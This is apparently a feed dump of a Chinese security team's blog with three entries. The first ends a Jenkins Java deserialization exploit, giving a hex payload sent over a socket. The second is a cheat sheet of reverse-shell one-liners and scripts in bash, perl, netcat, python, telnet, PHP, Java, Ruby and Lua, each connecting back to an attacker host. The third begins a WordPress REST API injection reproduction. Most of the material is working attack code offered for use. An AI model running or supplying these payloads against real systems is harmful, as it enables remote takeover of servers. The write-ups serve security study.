67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending payload...'</span></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></table></figure>
<p>最后发包第一部分实际为“&lt;===[JENKINS REMOTING CA PACITY]===&gt;”的十六进制，貌似jenkins客户端发包里开头都是这个，第二部分为替换原有序列化对象的构造对象，第三部分为原有包里剩下的部分，直接从wirehsark copy</p>
<p>5.反弹shell</p>
<p><img src="http://i1.piimg.com/567571/5a347e02f97fefaf.png" alt=""><br>对于漏洞主机，可以这么利用。</p>
<p><img src="http://i1.piimg.com/567571/6b5f0cb7f290ad61.png" alt=""><br>远程主机未装nc   </p>
<p><img src="http://i1.piimg.com/567571/96b01a4f7477367c.png" alt=""><br><img src="http://i1.piimg.com/567571/1f8730f4aa1d8a62.png" alt=""><br><img src="http://i1.piimg.com/567571/fdc0940aee863e9d.png" alt=""></p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>1.WebLogic, WebSphere, JBoss, Jenkins, and OpenNMS等java应用都曾受过该漏洞影响。Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的问题，WebLogic等存在此问题的应用可能只是冰山一角。</p>
<p>2.首先拿到一个漏洞应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如readObject()）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含序列化数据来判断，如java序列化数据的特征为以标记（ac ed 00 05）开头。确定了反序列化输入点后，再考察应用的Class Path中是否包含相应的基础库，如Apache Commons Collections库，可通过“grep -R InvokerTransformer .”确认是否包含exp需要的类库（把“InvokerTransformer”删除干净则此漏洞便无法触发）。</p>
<p>3.新版本虽然抓不到端口信息了，但是exp需要的基础类库仍然存在。</p>
<p><img src="http://p1.bqimg.com/567571/c966099afbe860de.png" alt=""> </p>
<p>4.解决方法：可以加入防火墙过滤相应端口的通信。假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。使用加密通信，如SSL。</p>
<p>参考链接：<br><a href="https://www.seebug.org/vuldb/ssvid-89725" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-89725</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://p1.bpimg.com/567571/87e3e6e05ca78561.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;很多JAVA应用反序列化时并没有限制实例化对象的类型，导致可以任意构造应用中已经包含的对象利用反序列化操作进行实例化，比如任意命令执行等。&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MS" scheme="http://das.scusec.org/tags/MS/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell姿势</title>
    <link href="http://das.scusec.org/2017/03/06/Reverse_Shell/"/>
    <id>http://das.scusec.org/2017/03/06/Reverse_Shell/</id>
    <published>2017-03-06T09:26:14.871Z</published>
    <updated>2017-03-06T09:26:14.871Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/66527ecf7ba88ee5.png" alt=""></p>
<p>遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。<br><a id="more"></a></p>
<ul>
<li>首先，选一个未被目标防火墙过滤的TCP端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker$ nc <span class="operator">-l</span> -v attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Bash</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/<span class="number">173.214</span>.<span class="number">173.151</span>/<span class="number">8080</span> <span class="number">0</span>&lt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&lt;&amp;<span class="number">196</span>;<span class="built_in">exec</span> <span class="number">196</span>&lt;&gt;/dev/tcp/attackerip/<span class="number">4444</span>; sh &lt;&amp;<span class="number">196</span> &gt;&amp;<span class="number">196</span> <span class="number">2</span>&gt;&amp;<span class="number">196</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="built_in">exec</span> <span class="number">5</span>&lt;&gt;/dev/tcp/attackerip/<span class="number">4444</span></span><br><span class="line"><span class="number">2</span>. cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; <span class="keyword">done</span>  <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line <span class="number">0</span>&lt;&amp;<span class="number">5</span>; <span class="keyword">do</span> <span class="variable">$line</span> <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Perl</strong>           </li>
</ul>
<p>不依赖于/bin/sh</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
<p>如果是目标基于windows，还可以</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
<p>也可上传一个<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="variable">$i</span>=<span class="string">"x.x.x.x"</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">		<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">			&#125;;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>Netcat</strong>  </li>
</ul>
<p>取决于nc的版本，在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="operator">-e</span> /bin/sh attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip <span class="number">4444</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道</span><br><span class="line">rm <span class="operator">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip <span class="number">4444</span> <span class="number">0</span>/tmp/p</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. mknod /tmp/backpipe p</span><br><span class="line"><span class="number">2</span>. /bin/sh <span class="number">0</span>&lt;/tmp/backpipe | nc attackerip listenport <span class="number">1</span>&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>python</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'10.16.44.100'</span> <span class="comment"># The remote host</span></span><br><span class="line">PORT = <span class="number">443</span> <span class="comment"># The same port as used by the server</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect to attacker machine</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="comment"># send we are connected</span></span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="comment"># start loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment"># recieve shell command</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># if its quit, then break out and close socket</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line"><span class="comment"># do shell command</span></span><br><span class="line">proc = subprocess.Popen(data, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment"># read output</span></span><br><span class="line">stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line"><span class="comment"># send output to attacker</span></span><br><span class="line">s.send(stdout_value)</span><br><span class="line"><span class="comment"># close socket</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Telnet</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm <span class="operator">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip <span class="number">4444</span> <span class="number">0</span>/tmp/p</span><br></pre></td></tr></table></figure>
<p>本地在4445端口监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip <span class="number">4444</span> | /bin/bash | telnet attackerip <span class="number">4445</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>PHP</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>JAVA</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Ruby</strong>    </li>
</ul>
<p>目标基于linux<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
<p>目标基于windows<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>lua</strong></li>
</ul>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
<p>参考链接：<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://p1.bpimg.com/567571/66527ecf7ba88ee5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MS" scheme="http://das.scusec.org/tags/MS/"/>
    
  </entry>
  
  <entry>
    <title>WordPress REST API内容注入漏洞复现</title>
    <link href="http://das.scusec.org/2017/03/06/WP-content-Injection/"/>
    <id>http://das.scusec.org/2017/03/06/WP-content-Injection/</id>
    <published>2017-03-06T09:25:44.816Z</published>
    <updated>2017-03-06T09:25:44.816Z</updated>
    
    <content type="html"><![CDATA[<!-- 这里是文章头部的图片 大小为800px*200px左右-->
<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/header.jpg" alt=""><br><!-- 这里是简单的介绍，50-100字 --><br>　　<br>WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p>
<a id="more"></a>
<h2 id="0x01-背景介绍"><a href="#0x01-背景介绍" class="headerlink" title="0x01 背景介绍"></a>0x01 背景介绍</h2><p>　　WordPress REST API插件提供了一个与语言无关的简单而方便的json数据接口，让我们可以通过HTTP获取简单方便的JSON(JavaScript Object Notation)格式的数据：用户，文章，分类等等。</p>
<p>　　获取或更新数据也变得非常简单，只需要发送一个HTTP请求就可以了。需要获取网站的文章？只需要发送一个GET请求到/wp-json/posts，需要更新ID为4的用户？只需要发送一个POST请求到/wp-json/users/4，搜索关键词为 “awesome”的所有文章，发送一个GET请求到/wp-json/posts?filter[s]=awesome</p>
<p>　　在4.7.0版本后，REST API插件的功能被集成到WordPress中，WP REST API (WP API) 能让你创建、编辑获取文章（各种WordPress内置的文章类型的文章以及自定义类型的文章）、创建、编辑和获取用户等，因此，它在某些情形下需要认证 (授权)，比如创建和编辑操作，就绝对需要授权才行，否则，处理申请会被 WordPress 拒绝。此次漏洞就是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p>
<h2 id="0x02-本地搭建WordPress平台"><a href="#0x02-本地搭建WordPress平台" class="headerlink" title="0x02 本地搭建WordPress平台"></a>0x02 本地搭建WordPress平台</h2><p>漏洞影响WordPress版本：4.7.0和4.7.1
　　</p>
<p>复现环境：Wampserver(Apache2.4.23；PHP7.0.10；MySQL5.7.14)</p>
<p>下载WordPress4.7.1版本程序包，解压到wamp安装目录下即：D;\wamp64\www.</p>
<p>从浏览器打开（127.0.0.1/wamp64/wordpress）按提示进行设置，完成网站搭建。</p>
<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/1.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/2.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/3.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/4.png" alt=""></p>
<p><strong>加载Apache的Mod_rewrite模块：</strong></p>
<p>　　（Mod_rewrite模块包括很多工作，其中最常用的就是在网站编辑时声明规则，被Apache实时地将访问者请求的静态URL地址映射为动态查询字符串，并发送给不同的PHP脚本处理。从搜索引擎蜘蛛的角度看来，这些URL地址是静态的，也就是平时我们说的动态网站静态化。）</p>
<p>　　一般在安装Apache时已经包含了modrewrite模块。 在Apache的安装目录的modules文件夹下查找一个文件modrewrite,如果找到的话就是已经安装了。</p>
<p>　　一般mod_rewrite默认是不启动的，这时我们需要手动启用它。 打开Apache名为“httpd.conf”的配置文件，找到<br><code>#LoadModule rewrite_module modules/mod_rewrite.so</code>将#注释符删除，使得Apache在启动时就加载mod_rewrite模块。</p>
